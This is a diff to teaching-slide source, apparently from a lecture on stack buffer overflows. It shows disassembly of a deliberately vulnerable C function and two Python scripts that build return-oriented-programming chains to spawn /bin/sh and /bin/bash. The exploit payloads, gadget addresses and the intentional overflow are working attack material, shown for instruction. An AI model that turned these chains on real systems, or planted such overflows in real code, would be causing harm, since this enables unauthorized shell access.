@@ -44,6 +44,7 @@ def hello_c:
 
 void say_hello() {
   char name[10];
+  printf("[debug: reading into %p]\n", name);
   FILE *f = fopen("name", "rb");
   |@bug
   fclose(f);
@@ -87,29 +88,32 @@ def buffer_pip: @tt{ }
 def say_hello_asm:
   @verbatim|{
 _say_hello:
-0000000100003e60	subq	$0x18, %rsp
-0000000100003e64	leaq	0xd9(%rip), %rdi   # "name"
-0000000100003e6b	leaq	0xd7(%rip), %rsi   # "rb"
-0000000100003e72	callq	0x100003f38        # _fopen
-0000000100003e77	movq	%rax, (%rsp)
-0000000100003e7b	leaq	0xe(%rsp), %rdi|@buffer_pip
-0000000100003e80	movq	(%rsp), %rdx
-0000000100003e84	movl	$0x100, %esi
-0000000100003e89	callq	0x100003f32        # _fgets
-0000000100003e8e	movq	(%rsp), %rdi
-0000000100003e92	callq	0x100003f2c        # _fclose
-0000000100003e97	leaq	0xe(%rsp), %rsi
-0000000100003e9c	leaq	0xa9(%rip), %rdi   # "hello %s\n"
-0000000100003ea3	movb	$0x0, %al
-0000000100003ea5	callq	0x100003f3e        # _printf
-0000000100003eaa	addq	$0x18, %rsp
-0000000100003eae	retq
-0000000100003eaf	nop
+0000000100000e30  subq   $0x18, %rsp
+0000000100000e34  leaq   0xe(%rsp), %rsi
+0000000100000e39  leaq   0x114(%rip), %rdi  # "[debug: ....]\n"
+0000000100000e40  movb   $0x0, %al
+0000000100000e42  callq  0x100000f1e        # _printf
+0000000100000e47  leaq   0x120(%rip), %rdi  # "name"
+0000000100000e4e  leaq   0x11e(%rip), %rsi  # "rb"
+0000000100000e55  callq  0x100000f18        # _fopen
+0000000100000e5a  movq   %rax, (%rsp)
+0000000100000e5e  leaq   0xe(%rsp), %rdi|@buffer_pip
+0000000100000e63  movq   (%rsp), %rdx
+0000000100000e67  movl   $0x100, %esi
+0000000100000e6c  callq  0x100000f12        # _fgets
+0000000100000e71  movq   (%rsp), %rdi
+0000000100000e75  callq  0x100000f0c        # _fclose
+0000000100000e7a  leaq   0xe(%rsp), %rsi
+0000000100000e7f  leaq   0xf0(%rip), %rdi   # "hello %s\n"
+0000000100000e86  movb   $0x0, %al
+0000000100000e88  callq  0x100000f1e        # _printf
+0000000100000e8d  addq   $0x18, %rsp
+0000000100000e91  retq
 }|
 
 slide(~title: @titlely{Disassembly of @tt{say_hello}},
       block:
-        let p = say_hello_asm.scale(0.7)
+        let p = say_hello_asm.scale(0.65)
         slide.alts(
           p,
           balloon.pin(~on: p,
@@ -132,27 +136,27 @@ def rax_pip = @tt{ }
 def show_date_asm:
   @verbatim|{
 _show_date:
-0000000100003ec0	subq	$0x18, %rsp
-0000000100003ec4	leaq	0x93(%rip), %rax   # "/bin/date"
-0000000100003ecb	movq	%rax, 0x10(%rsp)|@rax_pip
-0000000100003ed0	movq	0x10(%rsp), %rax
-0000000100003ed5	movq	%rax, (%rsp)
-0000000100003ed9	movq	$0x0, 0x8(%rsp)
-0000000100003ee2	movq	0x10(%rsp), %rdi
-0000000100003ee7	movq	%rsp, %rsi
-0000000100003eea	movq	0x10f(%rip), %rax  # _environ
-0000000100003ef1	movq	(%rax), %rdx
-0000000100003ef4	callq	0x100003f26        # _execve
-0000000100003ef9	addq	$0x18, %rsp
-0000000100003efd	retq
-0000000100003efe	nop
+0000000100000eb0  subq  $0x18, %rsp
+0000000100000eb4  leaq  0xad(%rip), %rax   # "/bin/date"
+0000000100000ebb  movq  %rax, 0x10(%rsp)|@rax_pip
+0000000100000ec0  movq  0x10(%rsp), %rax
+0000000100000ec5  movq  %rax, (%rsp)
+0000000100000ec9  movq  $0x0, 0x8(%rsp)
+0000000100000ed2  movq  0x10(%rsp), %rdi
+0000000100000ed7  movq  %rsp, %rsi
+0000000100000eda  movq  0x11f(%rip), %rax  # _environ
+0000000100000ee1  movq  (%rax), %rdx
+0000000100000ee4  callq  0x100000f16       # _execve
+0000000100000ee9  addq  $0x18, %rsp
+0000000100000eed  retq
+0000000100000eee  nop
 }|
 
 def get_shell_path_asm:
   @verbatim|{
 _get_shell_path:
-0000000100003eb0	leaq	0x9f(%rip), %rax   # "/bin/sh"
-0000000100003eb7	retq
+0000000100000ea0  leaq  0xb9(%rip), %rax # "/bin/sh"
+0000000100000ea7  retq
 }|
 
 slide(~title: @titlely{Disassembly of @tt{show_date}},
@@ -181,8 +185,8 @@ slide(~title: @titlely{Disassembly of @tt{get_shell_path}},
         slide.right(@para{right after @tt{"/bin/date"} assumed in RAX}.colorize("blue"))
       ))
 
-def get_shell_path_ret = boldly(@tt{0x0100003eb0})
-def inside_show_date_ret = boldly(@tt{0x0100003ecb})
+def get_shell_path_ret = boldly(@tt{0x100000ea0})
+def inside_show_date_ret = boldly(@tt{0x100000ebb})
 def mystery = boldly(@tt{??????})
 
 slide(~title: "Chaining Returns",
@@ -213,15 +217,18 @@ def sh_exploit_py:
 import sys;
 
 # address of `get_shell_path`:
-get_shell_path = b"\xb0\x3e\x00\x00\x01\x00\x00\x00"
+get_shell_path = 0x100000ea0
 
 # inside of `show_date` at the point where it expects
 # "/bin/date" to be in RAX:
-inside_show_date = b"\xcb\x3e\x00\x00\x01\x00\x00\x00"
+inside_show_date = 0x100000ebb
+
+def n2b(v):
+  return v.to_bytes(8, byteorder='little', signed=False)
 
 sys.stdout.buffer.write(b"a"*10
-                        + get_shell_path
-                        + inside_show_date)
+                        + n2b(get_shell_path)
+                        + n2b(inside_show_date))
 }|
 
 def exploit_title = "Constructing the Exploit"
@@ -272,19 +279,19 @@ slide(~title: chaining_more_title,
 
 def fgets_end_asm_top:
   @verbatim|{
-    0x7ff8131ff6f0 <+263>: movq   %rbx, %rax
-    0x7ff8131ff6f3 <+266>: addq   $0x18, %rsp
+    0x7ff8031a318a <+302>: movq   %rbx, %rax
+    0x7ff8031a318d <+305>: addq   $0x18, %rsp
   }|
 
 def fgets_end_asm_bottom:
   @verbatim|{
-    0x7ff8131ff6f7 <+270>: popq   %rbx
-    0x7ff8131ff6f8 <+271>: popq   %r12
-    0x7ff8131ff6fa <+273>: popq   %r13
-    0x7ff8131ff6fc <+275>: popq   %r14
-    0x7ff8131ff6fe <+277>: popq   %r15
-    0x7ff8131ff700 <+279>: popq   %rbp
-    0x7ff8131ff701 <+280>: retq   
+    0x7ff8031a3191 <+309>: popq   %rbx
+    0x7ff8031a3192 <+310>: popq   %r12
+    0x7ff8031a3194 <+312>: popq   %r13
+    0x7ff8031a3196 <+314>: popq   %r14
+    0x7ff8031a3198 <+316>: popq   %r15
+    0x7ff8031a319a <+318>: popq   %rbp
+    0x7ff8031a319b <+319>: retq   
   }|
 
 fun c_library_slide(options :~ OptMap) :~ OptMap:
@@ -334,9 +341,9 @@ let options = c_library_slide(options ++ { #'pop6 })
 let options = c_library_slide(options ++ { #'top })
 let options = c_library_slide(options ++ { #'pop9 })
 
-def gadget1_ret = boldly(@tt{0x7ff8131ff6f7})
-def gadget2_ret = boldly(@tt{0x7ff8131ff6f0})
-def stack_addr = boldly(@tt{0x030410b6ae})
+def gadget1_ret = boldly(@tt{0x7ff8031a3191})
+def gadget2_ret = boldly(@tt{0x7ff8031a318a})
+def stack_addr = boldly(@tt{0x30412a63e})
 def any_addr = @italic{anything}
 def any_h = any_addr.snapshot().handle
 
@@ -386,23 +393,26 @@ def bash_exploit_py:
 import sys;
 
 # pops 6 words into regsiters, including RBX:
-pops = b"\xf7\xf6\x1f\x13\xf8\x7f\x00\x00"
+pops = 0x7ff8031a3191
 # move RBX into RAX, then pops 9 words:
-move_and_pops = b"\xf0\xf6\x1f\x13\xf8\x7f\x00\x00"
+move_and_pops = 0x7ff8031a318a
 
 # location where `name` ends up on the stack:
-buffer_on_stack = b"\xae\xb6\x10\x04\x03\x00\x00\x00"
+buffer_on_stack = 0x30412a63e
 
 # inside of `show_date` at the point where it expects
 # "/bin/date" to be in RAX:
-inside_show_date = b"\xcb\x3e\x00\x00\x01\x00\x00\x00"
+inside_show_date = 0x100000ebb
+
+def n2b(v):
+  return v.to_bytes(8, byteorder='little', signed=False)
 
 sys.stdout.buffer.write(b"/bin/bash\x00"
-                        + pops
-                        + buffer_on_stack*6 # stack address into RBX
-                        + move_and_pops
-                        + buffer_on_stack*9 # stack address from RBX into RAX
-                        + inside_show_date)
+                        + n2b(pops)
+                        + n2b(buffer_on_stack)*6 # stack address into RBX
+                        + n2b(move_and_pops)
+                        + n2b(buffer_on_stack)*9 # stack address from RBX into RAX
+                        + n2b(inside_show_date))
 }|
 
 slide(~title: exploit_title,
